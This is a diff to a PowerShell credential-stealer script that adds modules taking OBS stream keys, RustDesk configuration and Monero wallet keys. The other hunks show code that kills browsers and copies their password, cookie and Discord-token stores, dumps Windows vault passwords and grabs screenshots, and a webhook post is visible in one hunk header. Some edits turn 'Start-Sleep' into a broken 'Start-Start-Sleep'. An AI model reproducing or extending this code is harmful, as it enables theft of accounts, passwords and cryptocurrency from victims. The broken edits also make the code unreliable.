@@ -69,6 +69,41 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 ############################################################################################################################################################
 
+# OBS Stream Key Steal
+$obs = Get-Childitem -Path $env:appdata\obs-studio\basic\profiles\ -Include service.json -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+if ($obs -ne $null) {
+	Write-Output $obs >> $env:tmp/$FolderName/ObsData.json
+}
+
+# RustDesk Config
+$rustdesk = Get-Childitem -Path $env:appdata\RuskDesk\config\ -Include RustDesk.toml -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+if ($rustdesk -ne $null) {
+	New-Item -Path $env:tmp/$FolderName/RustDesk -ItemType Directory
+	Copy-Item $env:appdata/RuskDesk/config $env:tmp/$FolderName/RustDesk/config -Recurse
+}
+
+# JDownloader logs
+$jdl = Get-Childitem -Path "$env:appdata\..\Local\JDownloader 2.0\" -Include Core.jar -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+if ($jdl -ne $null) {
+	New-Item -Path "$env:tmp/$FolderName/JDownloader2.0" -ItemType Directory
+	Copy-Item "$env:appdata\..\Local\JDownloader 2.0\logs" "$env:tmp/$FolderName/JDownloader2.0/logs" -Recurse
+}
+
+# qBittorrent Logs
+$qbt = Get-Childitem -Path "$env:appdata\..\Local\qBittorrent\logs" -Include qbittorrent.log -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+if ($qbt -ne $null) {
+	New-Item -Path "$env:tmp/$FolderName/qBittorrent" -ItemType Directory
+	Copy-Item "$env:appdata\..\Local\qBittorrent\logs" "$env:tmp/$FolderName/qBittorrent/logs" -Recurse
+}
+
+# Monero Wallet Stealer
+$documents=[Environment]::GetFolderPath("MyDocuments")
+$monero = Get-Childitem -Path  "$documents\Monero\wallets" -Includes *.keys -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+if ($monero -ne $null) {
+	New-Item -Path "$env:tmp/$FolderName/Monero" -ItemType Directory
+	Copy-Item "$documents\Monero\wallets" "$env:tmp/$FolderName/Monero/wallets" -Recurse
+}
+
 # Get Roblox Cookies
 function get-RobloxCookies {
 	try {
@@ -177,7 +212,7 @@ function Get-GeoLocation{
 	$GeoWatcher.Start() #Begin resolving current locaton
 
 	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
-		Start-Sleep -Milliseconds 100 #Wait for discovery.
+		Start-Start-Sleep -Milliseconds 100 #Wait for discovery.
 	}  
 
 	if ($GeoWatcher.Permission -eq 'Denied'){
@@ -650,18 +685,18 @@ foreach ($file in $ldb) {
 	$file=$file.Name
 	$f="$leveldb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 }
 $log = Get-ChildItem $leveldb\*.log
 foreach ($file in $log) {
 	$file=$file.Name
 	$f="$leveldb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 }
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
 Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
@@ -675,74 +710,74 @@ Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
 $key4 = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include key4.db -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if($key4 -ne $null){
 taskkill /IM firefox.exe /F
-sleep 1
+Start-Sleep 1
 New-Item -Path $env:tmp/$FolderName/Firefox -ItemType Directory
-echo $key4 > $env:TMP\$FolderName\Firefox\key4.db
+Write-Output $key4 > $env:TMP\$FolderName\Firefox\key4.db
 $logins = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
-echo $logins > $env:TMP\$FolderName\Firefox\logins.json
+Write-Output $logins > $env:TMP\$FolderName\Firefox\logins.json
 $cookies = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include cookies.sqlite -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
-echo $cookies > $env:TMP\$FolderName\Firefox\cookies.sqlite
+Write-Output $cookies > $env:TMP\$FolderName\Firefox\cookies.sqlite
 $localstorage = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include webappsstore.sqlite -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
-echo $localstorage > $env:TMP\$FolderName\Firefox\webappsstore.sqlite
+Write-Output $localstorage > $env:TMP\$FolderName\Firefox\webappsstore.sqlite
 $tokens = Get-Content "$env:TMP\$FolderName\Firefox\webappsstore.sqlite" | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-echo $tokens >> "$env:TMP\$FolderName\Firefox\DiscordTokens.txt"
+Write-Output $tokens >> "$env:TMP\$FolderName\Firefox\DiscordTokens.txt"
 $tokens2 = Get-Content "$env:TMP\$FolderName\Firefox\webappsstore.sqlite" | Select-String "mfa\.[\w-]{84}"
-echo $tokens2 >> "$env:TMP\$FolderName\Firefox\DiscordTokens.txt"
+Write-Output $tokens2 >> "$env:TMP\$FolderName\Firefox\DiscordTokens.txt"
 }
 
 # Get Chrome Passwords
 if([System.IO.File]::Exists("$env:appdata\..\Local\Google\Chrome\User Data\Local State")){
 taskkill /IM chrome.exe /F
-sleep 1
+Start-Sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\Google\Chrome" -Browser "Chrome"
 }
 
 # Get ChromeBeta Passwords
 if([System.IO.File]::Exists("$env:appdata\..\Local\Google\Chrome Beta\User Data\Local State")){
 taskkill /IM chromebeta.exe /F
-sleep 1
+Start-Sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\Google\Chrome Beta" -Browser "ChromeBeta"
 }
 
 # Get Chromium Passwords
 if([System.IO.File]::Exists("$env:appdata\..\Local\Chromium\User Data\Local State")){
 taskkill /IM chromium.exe /F
-sleep 1
+Start-Sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\Chromium" -Browser "Chromium"
 }
 
 # Get 360chrome Passwords
 if([System.IO.File]::Exists("$env:appdata\..\Local\360chrome\Chrome\User Data\Local State")){
 taskkill /IM 360chrome.exe /F
-sleep 1
+Start-Sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\360chrome\Chrome" -Browser "360Chrome"
 }
 
 # Get QQBrowser Passwords
 if([System.IO.File]::Exists("$env:appdata\..\Local\Tencent\QQBrowser\User Data\Local State")){
 taskkill /IM qqbrowser.exe /F
-sleep 1
+Start-Sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\Tencent\QQBrowser" -Browser "QQBrowser"
 }
 
 # Get Vivaldi Passwords
 if([System.IO.File]::Exists("$env:appdata\..\Local\Vivaldi\User Data\Local State")){
 taskkill /IM vivaldi.exe /F
-sleep 1
+Start-Sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\Vivaldi" -Browser "Vivaldi"
 }
 
 # Get CocCoc Passwords
 if([System.IO.File]::Exists("$env:appdata\..\Local\CocCoc\Browser\User Data\Local State")){
 taskkill /IM coccoc.exe /F
-sleep 1
+Start-Sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\CocCoc\Browser" -Browser "CocCoc"
 }
 
 # Get DCBrowser Passwords
 if([System.IO.File]::Exists("$env:appdata\..\Local\DCBrowser\User Data\Local State")){
 taskkill /IM dcbrowser.exe /F
-sleep 1
+Start-Sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\DCBrowser" -Browser "DCBrowser"
 }
 
@@ -750,7 +785,7 @@ chromiumBrowser -Path "$env:appdata\..\Local\DCBrowser" -Browser "DCBrowser"
 $path="$env:appdata\..\Local\SogouExplorer\Webkit"
 if([System.IO.File]::Exists("$path\Local State")){
 taskkill /IM sogou.exe /F
-sleep 1
+Start-Sleep 1
 $Browser="Sogou"
 New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
 $localstate = "$path\Local State"
@@ -764,18 +799,18 @@ foreach ($file in $ldb) {
 	$file=$file.Name
 	$f="$lvdb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 }
 $log = Get-ChildItem $lvdb\*.log
 foreach ($file in $log) {
 	$file=$file.Name
 	$f="$lvdb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 }
 $webdata = "$path\Default\Web Data"
 Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
@@ -789,21 +824,21 @@ Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
 # Get Edge Passwords
 if([System.IO.File]::Exists("$env:appdata\..\Local\Microsoft\Edge\User Data\Local State")){
 taskkill /IM msedge.exe /F
-sleep 1
+Start-Sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\Microsoft\Edge" -Browser "Edge"
 
 
 [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
 $vault = New-Object Windows.Security.Credentials.PasswordVault
-$passwords = $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password | Format-Table | Out-String
-echo $passwords > "$env:TMP\$FolderName\Edge\Passwords.txt"
+$passwords = $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | Select-Object username,resource,password | Format-Table | Out-String
+Write-Output $passwords > "$env:TMP\$FolderName\Edge\Passwords.txt"
 
 }
 
 # Get Brave Passwords
 if([System.IO.File]::Exists("$env:appdata\..\Local\BraveSoftware\Brave-Browser\User Data\Local State")){
 taskkill /IM brave.exe /F
-sleep 1
+Start-Sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\BraveSoftware\Brave-Browser" -Browser "Brave"
 }
 
@@ -812,7 +847,7 @@ $path="$env:appdata\Opera Software\Opera Stable"
 if([System.IO.File]::Exists("$path\Local State")){
 taskkill /IM opera.exe /F
 taskkill /IM launcher.exe /F
-sleep 1
+Start-Sleep 1
 $Browser="Opera"
 New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
 $localstate = "$path\Local State"
@@ -826,18 +861,18 @@ foreach ($file in $ldb) {
 	$file=$file.Name
 	$f="$lvdb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 }
 $log = Get-ChildItem $lvdb\*.log
 foreach ($file in $log) {
 	$file=$file.Name
 	$f="$lvdb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 }
 $webdata = "$path\Web Data"
 Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
@@ -853,7 +888,7 @@ $path="$env:appdata\Opera Software\Opera GX Stable"
 if([System.IO.File]::Exists("$path\Local State")){
 taskkill /IM opera.exe /F
 taskkill /IM launcher.exe /F
-sleep 1
+Start-Sleep 1
 $Browser="OperaGX"
 New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
 $localstate = "$path\Local State"
@@ -867,18 +902,18 @@ foreach ($file in $ldb) {
 	$file=$file.Name
 	$f="$lvdb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 }
 $log = Get-ChildItem $lvdb\*.log
 foreach ($file in $log) {
 	$file=$file.Name
 	$f="$lvdb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 }
 $webdata = "$path\Web Data"
 Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
@@ -891,7 +926,7 @@ Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
 # Get Yandex Passwords
 if([System.IO.File]::Exists("$env:appdata\..\Local\Yandex\YandexBrowser\User Data\Local State")){
 taskkill /IM browser.exe /F
-sleep 1
+Start-Sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\Yandex\YandexBrowser" -Browser "Yandex"
 }
 
@@ -916,18 +951,18 @@ foreach ($file in $ldb) {
 	$file=$file.Name
 	$f="$lvdb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 }
 $log = Get-ChildItem $lvdb\*.log
 foreach ($file in $log) {
 	$file=$file.Name
 	$f="$lvdb\$file"
 	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	echo $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	echo $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
 }
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
 }
@@ -965,13 +1000,13 @@ function Get-ScreenCapture
             Where-Object { $_.FormatDescription -eq "JPEG" }
     }
     process {
-        Start-Sleep -Milliseconds 250
+        Start-Start-Sleep -Milliseconds 250
         if ($OfWindow) {
             [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")
         } else {
             [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")
         }
-        Start-Sleep -Milliseconds 250
+        Start-Start-Sleep -Milliseconds 250
         $bitmap = [Windows.Forms.Clipboard]::GetImage()
         $ep = New-Object Drawing.Imaging.EncoderParameters
         $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)
